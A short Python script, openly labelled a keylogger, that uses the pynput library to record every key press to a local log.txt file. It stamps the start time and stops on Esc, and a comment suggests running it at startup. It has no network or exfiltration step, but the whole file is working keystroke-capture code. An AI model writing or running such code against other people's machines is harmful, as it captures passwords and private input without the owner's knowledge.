from datetime import datetime
from pynput.keyboard import Key, Listener


def on_press(key):
    write_file(key)


def write_file(key):
    
    # Opens log file and write words
    # Key.space is replaced by ' '
    # Key.enter is replaced by '\n'
    with open("log.txt", "a") as f:
        k = str(key).replace("'", "")
        
        if k.find("space") > 0:
            f.write(' ')
        elif k.find("enter") > 0:
            f.write('\n')
        else:
            f.write(k)


def on_release(key):

    # Stops the program if Key.esc is pressed
    if key == Key.esc:
        return False


def main():

    # Opens the log file and write the date and time
    # at which the program started
    # I think it can be useful if it's a script you run at startup
    with open("log.txt", "a") as f:
        f.write(f"\nKeylogger started at: {datetime.now()}\n")
    

    # Creates a listener and maps keys actions to functions, see pynput
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()